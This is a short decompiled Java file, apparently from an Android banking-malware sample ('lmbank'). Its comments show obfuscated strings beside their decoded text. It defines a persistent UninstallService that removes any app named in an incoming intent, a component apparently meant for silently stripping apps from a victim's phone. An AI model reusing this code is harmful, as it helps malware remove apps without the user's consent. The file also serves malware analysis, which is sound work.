package com.wish.lmbank.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/service/UninstallService.class */
public class UninstallService extends Service {
    private String TAG = UninstallService.class.getName();

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
//             LogUtils.v(this.TAG, bb7d7pu7.m5998("BgcqGwwIHQw"));
            LogUtils.v(this.TAG, "onCreate");
            super.onCreate();
            return;
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
//         LogUtils.v(this.TAG, bb7d7pu7.m5998("Bgc6HQgbHSoGBAQIBw0"));
        LogUtils.v(this.TAG, "onStartCommand");
        if (intent != null) {
//             String stringExtra = intent.getStringExtra(bb7d7pu7.m5998("GQgKAggODDYHCAQM"));
            String stringExtra = intent.getStringExtra("package_name");
            String str = this.TAG;
//             LogUtils.v(str, bb7d7pu7.m5998("GQgKAggODCcIBAxTSQ") + stringExtra);
            LogUtils.v(str, "packageName: " + stringExtra);
            SettingUtils.uninstallApk(this, stringExtra);
//            return Service.START_STICKY;
        }
        return Service.START_STICKY;
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
//         LogUtils.v(this.TAG, bb7d7pu7.m5998("BgctDBodGwYQ"));
        LogUtils.v(this.TAG, "onDestroy");
    }
}
